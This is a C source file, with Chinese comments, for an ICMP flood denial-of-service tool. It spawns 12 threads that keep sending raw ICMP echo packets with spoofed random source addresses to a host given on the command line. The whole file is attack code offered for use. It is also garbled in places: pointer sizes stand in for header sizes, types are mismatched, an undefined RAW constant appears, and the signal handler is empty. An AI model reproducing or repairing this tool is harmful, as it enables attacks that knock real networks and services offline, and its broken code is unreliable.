#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#define MAXCHILD 12
static unsigned long dest = 0;
static int PROTO_ICMP = -1;
static int alive = -1;
static int rawsock;

static inline long myrandom(int begin,int end);
static void dos_fun(unsigned long ip);
static void dos_icmp(void);
static void * dos_sig(int signo);
/*
* 随机函数
*/
static inline long myrandom(int begin,int end){
	int gap = end - begin+1;
	int ret =0;
	srand((unsigned)time(0));
	ret = random() % gap + begin;
	return ret;
}

/*多线程函数*/
static void dos_fun(unsigned long ip){
	while(alive){
		dos_icmp();
	}
}

static void dos_icmp(void){
	struct sockaddr_in to;
	struct ip *iph;
	struct icmp *icmph;
	char *packet;
	int pktsize = sizeof(struct ip*) +sizeof(struct icmp*) +64;
	packet = malloc(pktsize);
	iph = (struct ip *) packet;
	icmph = (struct icmp *)(packet + sizeof(struct ip*));
	memset(packet,0,pktsize);

	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pktsize);
	iph->ip_id = htons(getpid());
	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = PROTO_ICMP;
	iph->ip_sum = 0;
	iph->ip_src = (unsigned long) myrandom(0,65535);
	iph->ip_dst = dest;

	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;
	icmph->icmp_sum = htons(~(ICMP_ECHO << 8));

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst;
	to.sin_port = htons(0);

	sendto(rawsock,packet,pktsize,0,(struct sockaddr *)&to,sizeof(struct sockaddr));

	free(packet);
}

static void * dos_sig(int signo){

}

int main(int argc,char *argv[]){
	struct hostent * host = NULL;
	struct protoent * protocol = NULL;
	char protoname[] = "icmp";
	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	alive = 1;
	signal(SIGINT,dos_sig);//截取信号ctrl+c
	if(argc <2){
		return -1;
	}

	protocol = getprotobyname(protoname);
	if(protocol == NULL){
		perror("getprotobyname");
		return -1;
	}

	PROTO_ICMP = protocol->p_proto;

	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE){
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname");
			return -1;
		}

		memcpy((char *)&dest,host->h_addr.s_addr,host->h_length);
	}

	rawsock = socket(AF_INET,SOCK_RAW,RAW);//建立原始socket
	if(rawsock <0){
		rawsock = socket(AF_INET,SOCK_RAW,PROTO_ICMP);
	}
	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
	//设置ip
	for (int i = 0; i < MAXCHILD; ++i)
	{
		err = pthread_create(&pthread[i],NULL,dos_fun,NULL);
	}
	for (int i = 0; i < MAXCHILD; ++i)
	{
		pthread_join(pthread[i],NULL);
	}
	close(rawsock);
	return 0;


}